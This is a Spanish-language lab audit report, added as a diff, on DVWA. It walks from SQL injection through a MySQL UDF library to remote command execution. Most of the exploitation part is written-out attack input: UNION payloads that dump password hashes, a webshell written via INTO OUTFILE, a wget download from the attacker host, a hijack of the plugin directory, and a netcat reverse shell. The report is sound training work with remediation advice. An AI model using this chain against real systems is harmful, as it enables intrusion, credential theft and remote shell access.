@@ -1,0 +1,292 @@
+================================================================================
+              INFORME DE AUDITORÍA — DVWA: SQL Injection → RCE vía UDF
+              Autor: Alejandro Mamán López-Mingo (D1n0) — INSO 3A
+              Fecha: 11/03/2026 – 14/03/2026
+================================================================================
+
+================================================================================
+1. DATOS GENERALES
+================================================================================
+
+  Auditor/a    : Alejandro Mamán / D1n0
+  Fecha inicio : 11/03/2026
+  Fecha fin    : 14/03/2026
+  Plataforma   : DVWA
+  Objetivo     : 10.0.2.4 — DVWA
+  Tipo         : Caja gris
+  Autorización : Entorno de laboratorio controlado
+
+
+================================================================================
+2. RESUMEN
+================================================================================
+
+Se realizó una auditoría sobre DVWA con el objetivo de demostrar el camino
+completo desde una vulnerabilidad de SQL Injection hasta la obtención de
+ejecución remota de comandos (RCE) en el servidor.
+
+El proceso siguió un enfoque metódico: enumeración de la base de datos,
+verificación de privilegios, escritura de una librería UDF maliciosa y
+ejecución de comandos del sistema operativo a través de MySQL.
+
+  Resultado global    : [X] Crítico
+  Total vulns         : 1
+    - Críticas        : 1  (SQLi → RCE vía UDF)
+    - Altas/Medias/Bajas: 0
+
+
+================================================================================
+3. ALCANCE Y LIMITACIONES
+================================================================================
+
+  Sistemas en scope:
+    - Máquina DVWA — IP asignada en red NAT Network (VirtualBox)
+    - Servicio web DVWA sobre Apache/LAMPP
+    - Base de datos MySQL (usuario root@localhost)
+
+  Sistemas fuera de scope:
+    - Resto de sistemas de la red
+    - Infraestructura del host (Windows)
+
+  Limitaciones:
+    - Burp Suite activo causó interferencias → resuelto cambiando a Chromium
+    - Entorno de laboratorio, no refleja una red real
+
+  Herramientas utilizadas:
+    - Chromium (navegador sin proxy)
+    - Kali Linux (plataforma de ataque)
+    - VirtualBox (red NAT Network)
+    - MySQL / DVWA (objetivo)
+
+
+================================================================================
+4. FASES DE LA AUDITORÍA
+================================================================================
+
+--------------------------------------------------------------------------------
+FASE 1 — OBTENCIÓN DE INFORMACIÓN
+--------------------------------------------------------------------------------
+
+Al tratarse de un entorno controlado, el reconocimiento se limitó a la
+configuración de red. Se configuraron Kali y DVWA en la misma NAT Network
+para garantizar conectividad bidireccional. Se accedió a DVWA con nivel de
+seguridad LOW.
+
+
+--------------------------------------------------------------------------------
+FASE 2 — ENUMERACIÓN DE EQUIPOS
+--------------------------------------------------------------------------------
+
+  Servidor web  : Apache (LAMPP)
+  Base de datos : MySQL 5.1.41
+  Lenguaje      : PHP
+  SO            : Linux pc-linux-gnu — arquitectura i686 (32 bits)
+  Usuario MySQL : root@localhost (sin contraseña)
+
+
+--------------------------------------------------------------------------------
+FASE 3 — ANÁLISIS DE VULNERABILIDADES
+--------------------------------------------------------------------------------
+
+  ID    Vulnerabilidad               Severidad   CVSS   URL
+  V-01  SQL Injection (UNION-Based)  Crítica     9.8    /vulnerabilities/sqli/
+
+
+--------------------------------------------------------------------------------
+FASE 4 — EXPLOTACIÓN
+--------------------------------------------------------------------------------
+
+Vector: /vulnerabilities/sqli/ — parámetro User ID
+Herramienta: Manual (navegador)
+
+--- Paso 1 — Detección de la vulnerabilidad ---
+
+  1' and '1' = '1'-- -    → Devuelve admin/admin (verdadero)
+  ' or '1' = '1'-- -      → Devuelve todos los registros
+  1' and '1' = '2'-- -    → No devuelve nada (falso)
+
+  Conclusión: vulnerable a SQLi UNION-Based / Boolean-Based
+
+
+--- Paso 2 — Enumeración de columnas ---
+
+  1' ORDER BY 1-- -   → OK
+  1' ORDER BY 2-- -   → OK
+  1' ORDER BY 3-- -   → ERROR
+
+  La consulta devuelve 2 columnas. Confirmado con:
+  1' UNION SELECT NULL,NULL-- -
+
+
+--- Paso 3 — Extracción de información del servidor ---
+
+  1' UNION SELECT user(),database()-- -
+    → usuario: root@localhost | base de datos: dvwa
+
+  1' UNION SELECT version(),null-- -
+    → MySQL versión 5.1.41
+
+  1' UNION SELECT @@version_compile_os,@@version_compile_machine-- -
+    → OS: pc-linux-gnu | Arquitectura: i686 (32 bits)
+
+
+--- Paso 5 — Enumeración de bases de datos ---
+
+  1' UNION SELECT schema_name,null FROM information_schema.schemata-- -
+    → information_schema, cdcol, dvwa, mysql, phpmyadmin, test
+
+
+--- Paso 6 — Enumeración de tablas ---
+
+  1' UNION SELECT table_schema,table_name FROM information_schema.tables-- -
+    cdcol   : cds
+    dvwa    : guestbook, users
+    mysql   : user, func, plugin, ... (tablas del sistema)
+
+  Tablas relevantes: mysql.user (credenciales), mysql.func (UDFs), mysql.plugin
+
+
+--- Paso 7 — Extracción de credenciales ---
+
+  1' UNION SELECT user,password FROM dvwa.users-- -
+    admin   : 5f4dcc3b5aa765d61d8327deb882cf99
+    gordonb : e99a18c428cb38d5f260853678922e03
+    1337    : 8d3533d75ae2c3966d7e0d4fcc69216b
+    pablo   : 0d107d09f5bbe40cade3de5c71e9e9b7
+    smithy  : 5f4dcc3b5aa765d61d8327deb882cf99
+
+  1' UNION SELECT user,password FROM mysql.user-- -
+    → root sin contraseña (mala práctica crítica)
+
+
+--- Paso 8 — Verificación de privilegios para RCE ---
+
+  1' UNION SELECT file_priv,null FROM mysql.user WHERE user='root'-- -
+    → file_priv = Y  (MySQL puede leer/escribir ficheros en el SO)
+
+  1' UNION SELECT @@plugin_dir,null-- -
+    → /opt/lampp/lib/mysql/plugin/
+
+
+  Resultado: [X] Éxito
+  Acceso obtenido: nobody (uid=65534)
+
+
+--------------------------------------------------------------------------------
+FASE 5 — POST-EXPLOTACIÓN
+--------------------------------------------------------------------------------
+
+--- Paso 9 — Escritura de webshell vía SQLi ---
+
+  El webroot principal no era escribible (Errcode 13).
+  Directorio escribible identificado: /opt/lampp/htdocs/hackable/uploads/
+
+  Webshell inyectada:
+  1' UNION SELECT '',null INTO OUTFILE
+  '/opt/lampp/htdocs/hackable/uploads/cmd.php'-- -
+
+  Verificación de RCE:
+  http://10.0.2.5/hackable/uploads/cmd.php?cmd=id
+    → admin uid=65534(nobody) gid=65534(nogroup)
+
+
+--- Paso 10 — Localización y transferencia de la librería UDF ---
+
+  Librería localizada en Kali:
+  find / -name 'lib_mysqludf_sys*' 2>/dev/null
+    → /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.so
+
+  Servidor HTTP en Kali para transferir:
+  python3 -m http.server 8080
+
+  Descarga desde webshell:
+  cmd=wget http://10.0.2.4:8080/lib_mysqludf_sys_32.so -O /tmp/lib_mysqludf_sys.so
+
+
+--- Paso 11 — Bypass del plugin_dir mediante secuestro del proceso MySQL ---
+
+  El directorio oficial (/opt/lampp/lib/mysql/plugin/) pertenece a root.
+  Técnica: apagar MySQL → crear directorio controlado por nobody → relanzar
+  MySQL apuntando --plugin-dir a ese directorio.
+
+  Crear directorio controlado:
+  cmd=mkdir -p /opt/lampp/htdocs/hackable/uploads/tmp/
+
+  Copiar librería al directorio controlado:
+  cmd=cp /tmp/lib_mysqludf_sys.so /opt/lampp/htdocs/hackable/uploads/tmp/
+
+  Apagar MySQL (posible porque webshell y MySQL corren ambos como nobody):
+  cmd=/opt/lampp/bin/mysqladmin -u root shutdown
+
+  Borrar ficheros de bloqueo:
+  cmd=rm -f /opt/lampp/var/mysql/dvwa.pid /opt/lampp/var/mysql/mysql.sock
+
+  Relanzar mysqld con --plugin-dir controlado:
+  cmd=nohup /opt/lampp/sbin/mysqld \
+    --basedir=/opt/lampp \
+    --datadir=/opt/lampp/var/mysql \
+    --user=nobody \
+    --plugin-dir=/opt/lampp/htdocs/hackable/uploads/tmp/ \
+    --port=3306 2>/tmp/mysql_error.log &
+
+
+--- Paso 12 — Registro de la función UDF y RCE vía MySQL ---
+
+  Registrar sys_eval:
+  cmd=/opt/lampp/bin/mysql -u root -e \
+  "CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';"
+
+  Verificar RCE:
+  cmd=/opt/lampp/bin/mysql -u root -e "SELECT sys_eval('id');"
+    → uid=65534(nobody) gid=65534(nogroup)
+
+
+--- Paso 13 — RCE desde el formulario web de DVWA ---
+
+  Inyección directa en el campo User ID:
+  1' UNION SELECT 1, sys_eval('id')-- -
+    → Surname: uid=65534(nobody) gid=65534(nogroup)
+
+  Demostración completa: SQLi en formulario web → RCE en SO vía UDF MySQL.
+
+
+--- Paso 14 — Reverse shell ---
+
+  Listener en Kali:
+  nc -lvnp 4444
+
+  Reverse shell desde DVWA (mkfifo, nc sin -e):
+  1' UNION SELECT 1,sys_eval('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i
+  2>&1|nc 10.0.2.4 4444 >/tmp/f')-- -
+
+  Resultado: [X] Éxito — shell interactiva como uid=65534(nobody)
+
+
+================================================================================
+5. HALLAZGOS Y VULNERABILIDADES
+================================================================================
+
+  ID      : V-01
+  Severidad: Crítica
+  CVSS    : 9.8 / 10
+  CVE     : N/A (laboratorio)
+  CWE     : CWE-89 — Improper Neutralization of Special Elements in SQL Command
+
+  Descripción:
+    El parámetro User ID del módulo SQL Injection de DVWA no aplica ningún
+    tipo de sanitización ni parametrización de consultas. Permite inyectar
+    SQL arbitrario ejecutado directamente contra MySQL.
+
+  Impacto:
+    - Extracción completa de la base de datos
+    - Obtención de credenciales
+    - Dado que MySQL corre como root con file_priv=Y: escalada hasta RCE
+      en el sistema operativo
+
+  Recomendaciones:
+    - Usar consultas parametrizadas (prepared statements)
+    - Aplicar principio de mínimo privilegio en MySQL
+      (el usuario de la app no debe ser root)
+    - Establecer contraseña para el usuario root de MySQL
+
+================================================================================
